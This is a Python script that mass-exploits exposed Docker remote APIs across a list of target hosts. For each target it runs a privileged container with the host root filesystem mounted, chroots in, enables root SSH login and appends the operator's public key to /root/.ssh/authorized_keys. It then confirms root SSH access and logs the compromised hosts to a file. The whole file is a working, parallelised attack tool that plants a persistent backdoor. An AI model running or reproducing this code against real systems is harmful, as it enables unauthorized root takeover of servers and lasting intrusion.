#! /usr/bin/env python3

import os, docker, paramiko, socket
from getpass import getpass
from datetime import date
from optparse import OptionParser
from multiprocessing import Pool, Lock, cpu_count
from colorama import Fore, Back, Style
from time import strftime, localtime

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

lock = Lock()
thread_count = cpu_count()
check_ssh = True
allowed_images = ["ubuntu", "debian", "fedora"]
ssh_install_and_configure_commands = "apt install ssh -y && service ssh start && "

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

def check_port(host, port, timeout=None):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if timeout:
            socket.setdefaulttimeout(timeout)
        result = sock.connect_ex((host, port))
    except:
        return False
    else:
        if result == 0:
            return True
        sock.close()
def generatePublicPrivateKeys():
    display('*', "No Path Provided for Public Key File")
    display(':', "Creating New Private/Public Key Pairs")
    display('+', "Enter the file in which to save the key : ", end='')
    key_path = input()
    key_passphrase = getpass("Enter the Passphrase for the key : ")
    os.system(f"ssh-keygen -t rsa -b 4096 -C root -f '{key_path}' -N '{key_passphrase}'")
    return key_path, key_passphrase

def findDockerImage(docker_client, image_name):
    for image in docker_client.images.list():
        for tag in image.tags:
            if tag.startswith(image_name):
                return tag
    return None
def exploit(docker_client, image_name, public_key, ssh_running):
    volumes = {
        "/": {
            "bind": "/host",
            "mode": 'rw'
        }
    }
    command_payload = ""
    if not ssh_running:
        command_payload += ssh_install_and_configure_commands
    command_payload += f"grep -v 'PermitRootLogin' /etc/ssh/sshd_config > /tmp/sshd_config && mv /tmp/sshd_config /etc/ssh/sshd_config && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && echo {public_key} >> /root/.ssh/authorized_keys"
    docker_client.containers.run(image_name, f"chroot /host /bin/bash -c \"{command_payload}\"", privileged=True, volumes=volumes)
def checkExploit(target, private_key_file_path, private_key_passphrase, port=22, user="root"):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    private_key = paramiko.RSAKey.from_private_key_file(private_key_file_path, private_key_passphrase)
    try:
        ssh_client.connect(target, port=port, username=user, pkey=private_key)
        stdin, stdout, stderr = ssh_client.exec_command("uname -a")
        info = stdout.readlines()[0]
        ssh_client.close()
        return True, info.replace('\n', '')
    except Exception as error:
        return False, error

def main(target, key_path, public_key, key_passphrase, timeout=10, checkPort=True):
    with lock:
        display(':', f"Connecting to {Back.MAGENTA}{target}{Back.RESET}...")
    remote_docker_url = f"tcp://{target}"
    docker_client = docker.DockerClient(base_url=remote_docker_url)
    docker_image, image_installed = None, False
    for allowed_image in allowed_images:
        docker_image = findDockerImage(docker_client, allowed_image)
        if docker_image:
            with lock:
                display('+', f"Found Image {Back.MAGENTA}{docker_image}{Back.RESET}")
            break
    if not docker_image:
        with lock:
            display('-', f"Any Preinstalled usable Docker Image not found!")
        docker_image = allowed_images[0]
        with lock:
            display('*', f"Pulling Image {Back.MAGENTA}{docker_image}{Back.RESET}")
        docker_client.images.pull(docker_image)
        image_installed = True
    with lock:
        display('+', f"Using Image {Back.MAGENTA}{docker_image}{Back.RESET}")
        display('-', "Exploiting...")
    if checkPort and check_port(target.split(':')[0], 22, timeout):
        ssh_running = True
    elif not checkPort:
        ssh_running = True
    else:
        ssh_running = False
    exploit(docker_client, docker_image, public_key, ssh_running)
    with lock:
        display(':', f"Checking if Target {Back.MAGENTA}{target}{Back.RESET} was successfully exploited or not")
    exploit_status, info = checkExploit(target.split(':')[0], key_path, key_passphrase)
    if exploit_status:
        with lock:
            display('+', f"Successfully Exploited Target => {Back.MAGENTA}{target}{Back.RESET} ({Back.MAGENTA}{info}{Back.RESET})")
        successful_exploitation = True
    else:
        with lock:
            display('-', f"Failed to Exploit Target {Back.YELLOW}{target}{Back.RESET}")
        successful_exploitation = False
    if image_installed:
        docker_client.images.remove(docker_image)
    with lock:
        display(':', f"Closing Connection with {Back.MAGENTA}{target}{Back.RESET}...")
    docker_client.close()
    return successful_exploitation
def multiProcessingHandler(targets, key_path, public_key, key_passphrase, timeout=10, checkPort=True):
    successful_exploits = []
    for target in targets:
        try:
            exploit_status = main(target, key_path, public_key, key_passphrase, timeout, checkPort)
        except Exception as error:
            with lock:
                display('-', f"Error while Exploiting {Back.MAGENTA}{target}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            continue
        if exploit_status:
            successful_exploits.append(target)
    return successful_exploits

if __name__ == "__main__":
    arguments = get_arguments(('-t', "--target", "target", "Target Servers (Seperated by ',' or File Name)"),
                              ('-p', "--keys-path", "key_path", "Path for Public Key for SSH (Leave Empty to Generate New)"),
                              ('-c', "--check-port", "check_port", f"Check SSH Port (True/False, Default={check_ssh})"),
                              ('-T', "--timeout", "timeout", "Timeout for Request"),
                              ('-w', "--write", "write", "File to Dump Successful Exploited Targets (default=current data and time)"))
    if not arguments.target:
        display('-', f"Please specify {Back.YELLOW}Target Server{Back.RESET}")
        exit(0)
    else:
        try:
            with open(arguments.target, 'r') as file:
                arguments.target = [target.strip() for target in file.read().split('\n') if target != '']
        except FileNotFoundError:
            arguments.target = arguments.target.split(',')
        except Exception as error:
            display('-', f"Error Occured while Reading File {Back.MAGENTA}{arguments.target}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    if arguments.key_path:
        try:
            with open(f"{arguments.key_path}.pub", 'r') as file:
                arguments.public_key = file.read().replace('\n', '').strip()
            key_passphrase = getpass(f"Enter Passpharse for {arguments.key_path} : ")
            key_path = arguments.key_path
        except FileNotFoundError:
            key_path, key_passphrase = generatePublicPrivateKeys()
            try:
                with open(f"{key_path}.pub", 'r') as file:
                    arguments.public_key = file.read().replace('\n', '').strip()
            except Exception as error:
                display('-', f"Error Occured while Reading Public Key File {Back.MAGENTA}{key_path}.pub{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
                exit(0)
        except Exception as error:
            display('-', f"Error Occured while Reading Public Key File {Back.MAGENTA}{arguments.public_key}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    else:
        key_path, key_passphrase = generatePublicPrivateKeys()
        try:
            with open(f"{key_path}.pub", 'r') as file:
                arguments.public_key = file.read().replace('\n', '').strip()
        except Exception as error:
            display('-', f"Error Occured while Reading Public Key File {Back.MAGENTA}{key_path}.pub{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    if arguments.check_port == "False":
        arguments.check_port = False
    else:
        arguments.check_port = check_ssh
    if not arguments.timeout:
        arguments.timeout = None
    else:
        arguments.timeout = float(arguments.timeout)
    if not arguments.write:
        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.txt"
    total_targets = len(arguments.target)
    target_divisions = [arguments.target[group*total_targets//thread_count: (group+1)*total_targets//thread_count] for group in range(thread_count)]
    pool = Pool(thread_count)
    threads = []
    successful_exploits = []
    for thread_index, target_division in enumerate(target_divisions):
        threads.append(pool.apply_async(multiProcessingHandler, (target_division, key_path, arguments.public_key, key_passphrase, arguments.timeout, arguments.check_port)))
    for thread in threads:
        successful_exploits.extend(thread.get())
    pool.close()
    pool.join()
    with open(arguments.write, 'w') as file:
        file.write('\n'.join(successful_exploits))